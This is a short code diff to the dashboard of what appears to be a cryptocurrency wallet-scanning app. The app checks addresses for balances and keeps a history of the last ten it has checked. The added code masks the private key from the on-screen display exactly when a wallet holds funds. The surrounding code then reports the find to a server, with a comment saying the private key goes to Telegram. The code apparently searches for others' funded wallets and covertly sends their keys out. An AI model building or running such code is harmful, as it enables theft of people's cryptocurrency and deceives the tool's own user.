@@ -78,6 +78,21 @@ const Dashboard = ({ user, onLogout }) => {
         // Check balance on server
         try {
           const response = await axios.post(`${API}/scan/check-address`, { address });
+          
+          // Update current wallet display
+          const walletData = {
+            address: response.data.address,
+            privateKey: response.data.has_balance ? "********" : privateKey, // Hide if balance found
+            balance: response.data.balance,
+            hasBalance: response.data.has_balance,
+            timestamp: new Date().toLocaleTimeString()
+          };
+          
+          setCurrentWallet(walletData);
+          
+          // Add to history (keep last 10)
+          setWalletHistory(prev => [walletData, ...prev].slice(0, 10));
+          
           if (response.data.has_balance && response.data.balance > 0) {
             // Found funded wallet! Report to server (private key will be sent to Telegram)
             const reportResponse = await axios.post(`${API}/scan/report-found`, {
